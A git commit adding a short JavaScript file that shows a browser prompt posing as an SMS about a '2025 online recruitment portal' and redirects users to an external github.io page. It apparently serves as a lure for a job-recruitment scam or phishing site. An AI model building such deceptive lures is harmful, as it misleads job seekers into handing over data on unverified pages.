ba51a89c2857742de8388e2af9c417aec61b05ff
offernoww <josiahnyeti16@gmail.com>
2025-01-28 10:41:03 +0100

    Create newsms.js

---
+++ newsms.js
@@ -0,0 +1,6 @@
+
+var password = 'MME RECRUITMENT'
+password=prompt('SMS :2025 online recruitment portal, click OK to start your application','MME RECRUITMENT');
+if (password != 'MME RECRUITMENT') {
+location.href='https://offernoww.github.io/mme-recruitment-portal-na';
+}
